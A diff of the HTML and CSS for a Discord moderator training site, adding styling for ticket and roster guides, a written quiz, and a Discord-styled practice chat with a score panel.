@@ -3,18 +3,776 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Void Mod Training</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
-    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@300;400&display=swap" rel="stylesheet">
+    <title>VOID | Mod Training Suite</title>
+    
+    <!-- Premium Fonts -->
+    <link href="https://api.fontshare.com/v2/css?f[]=satoshi@900,700,500,300,400&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@100;200;300;400;500;600;700;800&display=swap" rel="stylesheet">
+    
+    <!-- Icons & Animations -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link rel="stylesheet" href="style.css">
-    <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
     <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
+    
+    <!-- Three.js & Particles -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
+    
+    <!-- GSAP for advanced animations -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.11.4/gsap.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.11.4/ScrollTrigger.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.11.4/TextPlugin.min.js"></script>
+    
+    <!-- Tailwind -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    
+    <!-- Custom CSS -->
     <style>
-        /* Discord font fix */
+        :root {
+            /* Premium Color Palette */
+            --void-black: #000000;
+            --void-black-90: #0a0a0a;
+            --void-black-80: #111111;
+            --void-black-70: #1a1a1a;
+            --void-black-60: #222222;
+            --void-black-50: #2a2a2a;
+            
+            --golish-white: #ffffff;
+            --golish-white-90: #f8fafc;
+            --golish-white-80: #f1f5f9;
+            --golish-white-70: #e2e8f0;
+            --golish-white-60: #cbd5e1;
+            
+            --reddish-black: #1c0a0a;
+            --crimson-void: #ff0033;
+            --crimson-void-dark: #cc0029;
+            --void-purple: #8b5cf6;
+            --void-cyan: #06b6d4;
+            --void-emerald: #10b981;
+            --void-amber: #f59e0b;
+            
+            /* Discord Colors */
+            --discord-bg: #36393f;
+            --discord-primary: #202225;
+            --discord-secondary: #2f3136;
+            --discord-tertiary: #40444b;
+            --discord-accent: #5865f2;
+            --discord-text: #dcddde;
+            --discord-text-muted: #72767d;
+            --discord-green: #3ba55c;
+            --discord-red: #ed4245;
+            --discord-yellow: #faa81a;
+            --discord-blurple: #5865f2;
+            
+            /* Typography */
+            --font-primary: 'Satoshi', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            --font-secondary: 'Inter', sans-serif;
+            --font-mono: 'JetBrains Mono', 'SF Mono', Monaco, Consolas, monospace;
+            --font-display: 'Satoshi', sans-serif;
+            
+            /* Animation Speeds */
+            --transition-fast: 300ms cubic-bezier(0.4, 0, 0.2, 1);
+            --transition-normal: 500ms cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: var(--font-primary);
+            background: linear-gradient(135deg, #000000 0%, #1c0a0a 50%, #2a0a1c 100%);
+            color: var(--golish-white);
+            min-height: 100vh;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+        
+        .container {
+            max-width: 1280px;
+            margin: 0 auto;
+            padding: 0 24px;
+        }
+        
+        /* ===== HEADER ===== */
+        .header {
+            text-align: center;
+            padding: 120px 0 80px;
+            position: relative;
+        }
+        
+        .header h1 {
+            font-size: 4rem;
+            font-weight: 900;
+            margin-bottom: 24px;
+            letter-spacing: -0.03em;
+            line-height: 1;
+            background: linear-gradient(135deg, #ff0033 0%, #8b5cf6 50%, #06b6d4 100%);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+        
+        .header p {
+            font-size: 1.25rem;
+            max-width: 600px;
+            margin: 0 auto;
+            color: var(--golish-white-70);
+            line-height: 1.7;
+        }
+        
+        .made-by {
+            position: absolute;
+            bottom: 32px;
+            right: 32px;
+            font-size: 0.875rem;
+            color: var(--golish-white-60);
+            font-family: var(--font-mono);
+        }
+        
+        /* ===== PROGRESS ===== */
+        .progress-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            max-width: 600px;
+            margin: 60px auto 0;
+            gap: 24px;
+        }
+        
+        .progress-step {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 12px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .step-icon {
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: var(--void-black-70);
+            border: 1px solid var(--void-black-60);
+            color: var(--golish-white-60);
+            font-size: 1.125rem;
+            transition: all 0.3s ease;
+        }
+        
+        .step-icon.active {
+            background: var(--golish-white);
+            color: var(--void-black);
+            border-color: var(--golish-white);
+        }
+        
+        .progress-step span {
+            font-size: 0.875rem;
+            font-weight: 500;
+            color: var(--golish-white-70);
+            transition: color 0.3s ease;
+        }
+        
+        .progress-step.active span {
+            color: var(--golish-white);
+        }
+        
+        .progress-bar {
+            flex: 1;
+            height: 1px;
+            background: var(--void-black-60);
+            position: relative;
+        }
+        
+        .progress-fill {
+            position: absolute;
+            top: 0;
+            left: 0;
+            height: 100%;
+            width: 0%;
+            background: var(--golish-white);
+            transition: width 0.6s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        
+        /* ===== CONTENT SECTIONS ===== */
+        .content-section {
+            margin-bottom: 48px;
+            padding: 40px;
+            background: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+        }
+        
+        .section-title {
+            font-size: 1.875rem;
+            font-weight: 700;
+            margin-bottom: 32px;
+            color: var(--golish-white);
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .section-title i {
+            color: var(--crimson-void);
+        }
+        
+        /* ===== TICKET TYPES ===== */
+        .intro-text {
+            font-size: 1.125rem;
+            line-height: 1.7;
+            color: var(--golish-white-80);
+            margin-bottom: 40px;
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 12px;
+            border-left: 4px solid var(--crimson-void);
+        }
+        
+        .ticket-types {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 24px;
+            margin: 40px 0;
+        }
+        
+        .ticket-card {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 16px;
+            padding: 32px;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .ticket-card:hover {
+            transform: translateY(-4px);
+            border-color: var(--crimson-void);
+            box-shadow: 0 0 30px rgba(255, 0, 51, 0.3);
+        }
+        
+        .ticket-card h3 {
+            font-size: 1.25rem;
+            font-weight: 700;
+            margin-bottom: 16px;
+            color: var(--golish-white);
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .ticket-card p {
+            color: var(--golish-white-70);
+            line-height: 1.6;
+        }
+        
+        /* ===== ROSTER CARDS ===== */
+        .roster-categories {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 24px;
+            margin: 40px 0;
+        }
+        
+        .roster-card {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 16px;
+            padding: 32px;
+            transition: all 0.3s ease;
+        }
+        
+        .roster-card:hover {
+            transform: translateY(-4px);
+            border-color: var(--void-purple);
+            box-shadow: 0 0 30px rgba(139, 92, 246, 0.3);
+        }
+        
+        .roster-header {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            margin-bottom: 24px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .roster-icon {
+            font-size: 1.5rem;
+            width: 56px;
+            height: 56px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(139, 92, 246, 0.1);
+            border-radius: 12px;
+            border: 1px solid rgba(139, 92, 246, 0.2);
+        }
+        
+        .roster-title {
+            font-size: 1.25rem;
+            font-weight: 700;
+            color: var(--golish-white);
+        }
+        
+        .roster-requirements {
+            list-style: none;
+        }
+        
+        .roster-requirements li {
+            color: var(--golish-white-70);
+            margin-bottom: 12px;
+            padding-left: 20px;
+            position: relative;
+            line-height: 1.5;
+        }
+        
+        .roster-requirements li:before {
+            content: '•';
+            position: absolute;
+            left: 0;
+            color: var(--void-purple);
+        }
+        
+        /* ===== MOD REQUIREMENTS ===== */
+        .mod-requirements {
+            margin: 60px 0;
+        }
+        
+        .requirement-section {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 16px;
+            padding: 32px;
+            margin-bottom: 24px;
+            transition: all 0.3s ease;
+        }
+        
+        .requirement-section:hover {
+            border-color: var(--void-cyan);
+        }
+        
+        .requirement-title {
+            font-size: 1.25rem;
+            font-weight: 700;
+            margin-bottom: 20px;
+            color: var(--golish-white);
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .requirement-content {
+            color: var(--golish-white-70);
+            line-height: 1.6;
+        }
+        
+        .requirement-list {
+            list-style: none;
+            margin: 20px 0;
+        }
+        
+        .requirement-list li {
+            color: var(--golish-white-70);
+            margin-bottom: 12px;
+            padding-left: 24px;
+            position: relative;
+        }
+        
+        .requirement-list li:before {
+            content: '•';
+            position: absolute;
+            left: 8px;
+            color: var(--void-cyan);
+        }
+        
+        .weekly-requirements {
+            color: var(--golish-white-80);
+            font-weight: 600;
+            margin-top: 20px;
+            padding: 16px;
+            background: rgba(6, 182, 212, 0.1);
+            border-radius: 8px;
+            border-left: 4px solid var(--void-cyan);
+        }
+        
+        /* ===== QUIZ SECTION ===== */
+        .quiz-instructions {
+            background: rgba(255, 0, 51, 0.1);
+            border: 1px solid rgba(255, 0, 51, 0.2);
+            border-radius: 16px;
+            padding: 40px;
+            margin: 60px 0;
+        }
+        
+        .quiz-instructions h3 {
+            font-size: 1.5rem;
+            font-weight: 700;
+            margin-bottom: 20px;
+            color: var(--golish-white);
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .quiz-instructions p {
+            color: var(--golish-white-70);
+            line-height: 1.7;
+            margin-bottom: 32px;
+        }
+        
+        .training-quiz {
+            margin: 60px 0;
+        }
+        
+        .question-card {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 16px;
+            padding: 40px;
+            margin-bottom: 32px;
+            display: none;
+            animation: fadeIn 0.4s ease;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .question-card.active {
+            display: block;
+        }
+        
+        .question-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            margin-bottom: 32px;
+            padding-bottom: 24px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .question-title {
+            font-size: 1.375rem;
+            font-weight: 700;
+            color: var(--golish-white);
+            line-height: 1.4;
+        }
+        
+        .question-number {
+            font-size: 0.875rem;
+            color: var(--golish-white-60);
+            font-family: var(--font-mono);
+            padding: 6px 12px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+        }
+        
+        .question-description {
+            color: var(--golish-white-70);
+            line-height: 1.7;
+            margin-bottom: 32px;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 12px;
+            border-left: 4px solid var(--void-amber);
+        }
+        
+        .answer-box {
+            width: 100%;
+            min-height: 120px;
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            color: var(--golish-white);
+            font-family: var(--font-primary);
+            font-size: 1rem;
+            line-height: 1.6;
+            resize: vertical;
+            transition: all 0.3s ease;
+            margin-bottom: 32px;
+        }
+        
+        .answer-box:focus {
+            outline: none;
+            border-color: var(--crimson-void);
+            box-shadow: 0 0 0 3px rgba(255, 0, 51, 0.1);
+        }
+        
+        .quiz-buttons {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 40px;
+        }
+        
+        /* ===== BUTTONS ===== */
+        .btn {
+            padding: 14px 32px;
+            border-radius: 12px;
+            font-weight: 600;
+            font-size: 1rem;
+            cursor: pointer;
+            border: 2px solid transparent;
+            transition: all 0.3s ease;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            font-family: var(--font-primary);
+        }
+        
+        .btn-primary {
+            background: linear-gradient(135deg, #ff0033 0%, #cc0029 100%);
+            color: var(--golish-white);
+            border: none;
+        }
+        
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(255, 0, 51, 0.4);
+        }
+        
+        .btn-secondary {
+            background: transparent;
+            color: var(--golish-white);
+            border: 2px solid var(--void-black-60);
+        }
+        
+        .btn-secondary:hover {
+            border-color: var(--golish-white-60);
+            background: rgba(255, 255, 255, 0.05);
+        }
+        
+        .btn-success {
+            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
+            color: var(--golish-white);
+            border: none;
+        }
+        
+        .btn-success:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(16, 185, 129, 0.4);
+        }
+        
+        .btn-test {
+            background: transparent;
+            color: var(--golish-white);
+            border: 2px solid var(--void-black-60);
+        }
+        
+        .btn-test:hover {
+            border-color: var(--void-purple);
+            background: rgba(139, 92, 246, 0.1);
+        }
+        
+        /* ===== ANSWER FEEDBACK ===== */
+        .answer-feedback {
+            margin-top: 32px;
+            padding: 32px;
+            background: rgba(6, 182, 212, 0.1);
+            border: 1px solid rgba(6, 182, 212, 0.2);
+            border-radius: 12px;
+            display: none;
+            animation: fadeIn 0.4s ease;
+        }
+        
+        .answer-feedback.show {
+            display: block;
+        }
+        
+        .feedback-title {
+            font-size: 1.125rem;
+            font-weight: 700;
+            margin-bottom: 20px;
+            color: var(--void-cyan);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .correct-answer {
+            color: var(--golish-white-80);
+            line-height: 1.6;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 8px;
+            margin-bottom: 20px;
+            border-left: 4px solid var(--void-cyan);
+        }
+        
+        .correction-note {
+            color: var(--golish-white-70);
+            font-size: 0.9375rem;
+            line-height: 1.6;
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 8px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        /* ===== COMPLETION SCREEN ===== */
+        .completion-screen {
+            text-align: center;
+            padding: 120px 0;
+            display: none;
+            animation: fadeIn 0.6s ease;
+        }
+        
+        .completion-screen.active {
+            display: block;
+        }
+        
+        .completion-icon {
+            font-size: 64px;
+            color: var(--crimson-void);
+            margin-bottom: 40px;
+            animation: float 6s ease-in-out infinite;
+        }
+        
+        @keyframes float {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-20px); }
+        }
+        
+        .completion-title {
+            font-size: 3rem;
+            font-weight: 900;
+            margin-bottom: 24px;
+            color: var(--golish-white);
+        }
+        
+        .completion-message {
+            font-size: 1.125rem;
+            max-width: 600px;
+            margin: 0 auto 60px;
+            color: var(--golish-white-70);
+            line-height: 1.7;
+        }
+        
+        .completion-buttons {
+            display: flex;
+            gap: 16px;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+        
+        /* ===== FOOTER ===== */
+        .footer {
+            text-align: center;
+            padding: 60px 0 40px;
+            margin-top: 80px;
+            border-top: 1px solid var(--void-black-60);
+            color: var(--golish-white-60);
+            font-size: 0.875rem;
+        }
+        
+        .footer p {
+            margin-bottom: 12px;
+        }
+        
+        .footer-credit {
+            margin-top: 20px;
+            font-size: 0.75rem;
+            color: var(--golish-white-50);
+            font-family: var(--font-mono);
+        }
+        
+        /* ===== MODAL ===== */
+        .username-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.9);
+            z-index: 10000;
+            align-items: center;
+            justify-content: center;
+            backdrop-filter: blur(10px);
+        }
+        
+        .username-modal.active {
+            display: flex;
+        }
+        
+        .modal-content {
+            background: var(--void-black-80);
+            border: 1px solid var(--void-black-60);
+            border-radius: 20px;
+            padding: 48px;
+            width: 90%;
+            max-width: 500px;
+            position: relative;
+        }
+        
+        .modal-title {
+            font-size: 1.75rem;
+            font-weight: 700;
+            margin-bottom: 20px;
+            color: var(--golish-white);
+            text-align: center;
+        }
+        
+        .modal-description {
+            color: var(--golish-white-70);
+            margin-bottom: 32px;
+            text-align: center;
+            line-height: 1.6;
+            font-size: 1rem;
+        }
+        
+        .username-input {
+            width: 100%;
+            padding: 16px;
+            background: var(--void-black-70);
+            border: 1px solid var(--void-black-60);
+            border-radius: 12px;
+            color: var(--golish-white);
+            font-size: 1rem;
+            font-family: var(--font-primary);
+            transition: all 0.3s ease;
+            margin-bottom: 32px;
+        }
+        
+        .username-input:focus {
+            outline: none;
+            border-color: var(--crimson-void);
+            box-shadow: 0 0 0 3px rgba(255, 0, 51, 0.1);
+        }
+        
+        .modal-buttons {
+            display: flex;
+            gap: 16px;
+            justify-content: center;
+        }
+        
+        /* ===== DISCORD TEST PAGE (EXACT 1:1 CLONE) ===== */
+        .test-page {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: var(--discord-bg);
+            z-index: 10000;
+            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            color: var(--discord-text);
+        }
+        
+        /* Discord fonts */
         @font-face {
             font-family: Whitney;
             src: url(https://discord.com/assets/6c6374bad0b0b6d204d8d6dc4a18d820.woff);
@@ -40,9 +798,776 @@
             src: url(https://discord.com/assets/8e12fb4f14d9c4592eb8ec9f22337b04.woff);
             font-weight: 700;
         }
+        
+        .test-page * {
+            font-family: Whitney, 'Helvetica Neue', Helvetica, Arial, sans-serif;
+        }
+        
+        .back-to-training {
+            position: absolute;
+            top: 16px;
+            right: 16px;
+            z-index: 10001;
+            background: var(--discord-primary);
+            border: 1px solid var(--discord-primary);
+            color: var(--discord-text);
+            padding: 8px 16px;
+            border-radius: 3px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            transition: background-color .17s ease,color .17s ease;
+        }
+        
+        .back-to-training:hover {
+            background: var(--discord-tertiary);
+        }
+        
+        .test-container {
+            display: flex;
+            height: 100vh;
+            width: 100%;
+        }
+        
+        /* Server list (leftmost) */
+        .server-list {
+            width: 72px;
+            background: var(--discord-primary);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 12px 0;
+            gap: 8px;
+            overflow-y: auto;
+        }
+        
+        .server-item {
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            background: var(--discord-bg);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 600;
+            color: white;
+            cursor: pointer;
+            transition: border-radius .2s, background-color .2s;
+        }
+        
+        .server-item.active {
+            background: var(--discord-accent);
+            border-radius: 16px;
+        }
+        
+        .separator {
+            width: 32px;
+            height: 2px;
+            background: rgba(255, 255, 255, 0.06);
+            margin: 4px 0;
+        }
+        
+        /* Discord sidebar */
+        .discord-sidebar {
+            width: 240px;
+            background-color: var(--discord-secondary);
+            display: flex;
+            flex-direction: column;
+            border-right: 1px solid var(--discord-primary);
+        }
+        
+        .server-header {
+            height: 48px;
+            display: flex;
+            align-items: center;
+            padding: 0 16px;
+            box-shadow: 0 1px 0 rgba(0, 0, 0, 0.2);
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+            user-select: none;
+        }
+        
+        .scrollable-channels {
+            flex: 1;
+            overflow-y: auto;
+            padding: 0 8px;
+        }
+        
+        .channel-category {
+            margin-top: 16px;
+        }
+        
+        .category-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 8px;
+            height: 24px;
+            font-size: 12px;
+            font-weight: 600;
+            text-transform: uppercase;
+            color: var(--discord-text-muted);
+            cursor: pointer;
+            user-select: none;
+        }
+        
+        .category-icon {
+            font-size: 10px;
+            opacity: 0.6;
+        }
+        
+        .channel-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 6px 8px;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            user-select: none;
+            margin: 1px 0;
+            color: var(--discord-text-muted);
+            transition: background-color .1s, color .1s;
+        }
+        
+        .channel-item:hover {
+            background: rgba(255, 255, 255, 0.05);
+            color: var(--discord-text);
+        }
+        
+        .channel-item.active {
+            background: rgba(255, 255, 255, 0.1);
+            color: var(--discord-text);
+        }
+        
+        .channel-icon {
+            font-size: 16px;
+            width: 20px;
+            text-align: center;
+        }
+        
+        .channel-name {
+            flex: 1;
+        }
+        
+        .channel-unread {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: white;
+            margin-right: 8px;
+        }
+        
+        /* User panel */
+        .user-panel {
+            height: 52px;
+            background: var(--discord-primary);
+            display: flex;
+            align-items: center;
+            padding: 0 8px;
+            gap: 8px;
+        }
+        
+        .user-avatar {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background: var(--discord-accent);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 600;
+            font-size: 14px;
+            color: white;
+            position: relative;
+        }
+        
+        .status-indicator {
+            position: absolute;
+            bottom: -1px;
+            right: -1px;
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background: var(--discord-green);
+            border: 2px solid var(--discord-primary);
+        }
+        
+        .user-info {
+            flex: 1;
+            min-width: 0;
+        }
+        
+        .username {
+            font-weight: 600;
+            font-size: 14px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+        
+        .discriminator {
+            color: var(--discord-text-muted);
+            font-size: 12px;
+        }
+        
+        .user-controls {
+            display: flex;
+            gap: 4px;
+        }
+        
+        .control-btn {
+            width: 32px;
+            height: 32px;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--discord-text-muted);
+            cursor: pointer;
+            transition: background-color .1s, color .1s;
+        }
+        
+        .control-btn:hover {
+            background: rgba(255, 255, 255, 0.05);
+            color: var(--discord-text);
+        }
+        
+        /* Discord chat area */
+        .discord-chat-area {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            background: var(--discord-bg);
+        }
+        
+        /* Chat header */
+        .chat-header {
+            height: 48px;
+            display: flex;
+            align-items: center;
+            padding: 0 16px;
+            box-shadow: 0 1px 0 rgba(0, 0, 0, 0.2);
+            border-bottom: 1px solid var(--discord-primary);
+            z-index: 1;
+        }
+        
+        .channel-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .channel-hash {
+            font-size: 24px;
+            color: var(--discord-text-muted);
+            font-weight: 400;
+        }
+        
+        .channel-title {
+            font-weight: 600;
+            font-size: 16px;
+        }
+        
+        .channel-topic {
+            color: var(--discord-text-muted);
+            font-size: 14px;
+            margin-left: 8px;
+        }
+        
+        .chat-controls {
+            margin-left: auto;
+            display: flex;
+            gap: 8px;
+        }
+        
+        .header-btn {
+            width: 32px;
+            height: 32px;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--discord-text-muted);
+            cursor: pointer;
+            transition: background-color .1s, color .1s;
+        }
+        
+        .header-btn:hover {
+            background: rgba(255, 255, 255, 0.05);
+            color: var(--discord-text);
+        }
+        
+        /* Messages container */
+        .messages-container {
+            flex: 1;
+            overflow-y: auto;
+            padding: 16px;
+            display: flex;
+            flex-direction: column;
+            gap: 1px;
+        }
+        
+        /* Message groups */
+        .message-group {
+            margin-bottom: 20px;
+        }
+        
+        .message-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 4px;
+            padding: 0 8px;
+        }
+        
+        .message-avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: var(--discord-accent);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 600;
+            color: white;
+            cursor: pointer;
+            transition: border-radius .2s;
+        }
+        
+        .message-author {
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        
+        .message-timestamp {
+            color: var(--discord-text-muted);
+            font-size: 12px;
+            font-weight: 400;
+        }
+        
+        .message-content {
+            margin-left: 56px;
+            padding: 0 8px;
+            font-size: 16px;
+            line-height: 1.375;
+        }
+        
+        /* Bot tag */
+        .bot-tag {
+            background: var(--discord-accent);
+            color: white;
+            font-size: 10px;
+            font-weight: 600;
+            padding: 1px 4px;
+            border-radius: 3px;
+            margin-left: 4px;
+            vertical-align: middle;
+            text-transform: uppercase;
+            line-height: 16px;
+        }
+        
+        /* Typing indicator */
+        .typing-indicator {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 16px;
+            color: var(--discord-text-muted);
+            font-size: 14px;
+        }
+        
+        .typing-dots {
+            display: flex;
+            gap: 4px;
+        }
+        
+        .typing-dot {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: var(--discord-text-muted);
+            animation: typing 1.4s infinite ease-in-out;
+        }
+        
+        @keyframes typing {
+            0%, 80%, 100% { transform: scale(0.8); opacity: 0.5; }
+            40% { transform: scale(1); opacity: 1; }
+        }
+        
+        /* Message input */
+        .message-input-area {
+            padding: 16px;
+            background: var(--discord-bg);
+        }
+        
+        .message-input-container {
+            background: var(--discord-secondary);
+            border-radius: 8px;
+            border: 1px solid var(--discord-primary);
+            overflow: hidden;
+        }
+        
+        .message-input-wrapper {
+            display: flex;
+            align-items: center;
+            padding: 0 16px;
+            min-height: 44px;
+        }
+        
+        .message-input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            color: var(--discord-text);
+            font-size: 16px;
+            font-family: Whitney, 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            line-height: 1.375;
+            resize: none;
+            padding: 10px 0;
+            max-height: 200px;
+            min-height: 20px;
+        }
+        
+        .message-input:focus {
+            outline: none;
+        }
+        
+        .message-input-send {
+            background: var(--discord-accent);
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 8px 16px;
+            font-weight: 500;
+            font-size: 14px;
+            cursor: pointer;
+            transition: background-color .17s ease;
+            margin-left: 8px;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+        
+        .message-input-send:hover {
+            background: #4752c4;
+        }
+        
+        .message-input-send:disabled {
+            background: var(--discord-text-muted);
+            cursor: not-allowed;
+        }
+        
+        /* Test info panel */
+        .test-info-panel {
+            width: 240px;
+            background: var(--discord-secondary);
+            border-left: 1px solid var(--discord-primary);
+            padding: 16px;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+        
+        .test-info-title {
+            font-weight: 600;
+            font-size: 16px;
+            color: var(--discord-text);
+        }
+        
+        .test-info-description {
+            color: var(--discord-text-muted);
+            font-size: 14px;
+            line-height: 1.375;
+        }
+        
+        .score-display {
+            background: var(--discord-primary);
+            border-radius: 8px;
+            padding: 16px;
+            text-align: center;
+        }
+        
+        .score-label {
+            color: var(--discord-text-muted);
+            font-size: 12px;
+            font-weight: 600;
+            text-transform: uppercase;
+            margin-bottom: 8px;
+        }
+        
+        .score-value {
+            font-size: 32px;
+            font-weight: 700;
+            color: var(--discord-text);
+        }
+        
+        .score-total {
+            color: var(--discord-text-muted);
+            font-size: 16px;
+        }
+        
+        .progress-bar {
+            height: 4px;
+            background: var(--discord-primary);
+            border-radius: 2px;
+            margin-top: 12px;
+            overflow: hidden;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: var(--discord-accent);
+            width: 0%;
+            transition: width 0.5s ease;
+        }
+        
+        .status-indicator-panel {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 12px;
+            background: var(--discord-primary);
+            border-radius: 8px;
+        }
+        
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: var(--discord-green);
+        }
+        
+        .status-text {
+            font-size: 14px;
+            font-weight: 500;
+            color: var(--discord-text);
+        }
+        
+        /* Test complete screen */
+        .test-complete-screen {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: var(--discord-bg);
+            z-index: 10001;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .test-complete-screen.active {
+            display: flex;
+        }
+        
+        .test-result-container {
+            background: var(--discord-secondary);
+            border-radius: 8px;
+            padding: 32px;
+            max-width: 500px;
+            width: 100%;
+            border: 1px solid var(--discord-primary);
+            text-align: center;
+        }
+        
+        .test-result-icon {
+            font-size: 64px;
+            margin-bottom: 24px;
+        }
+        
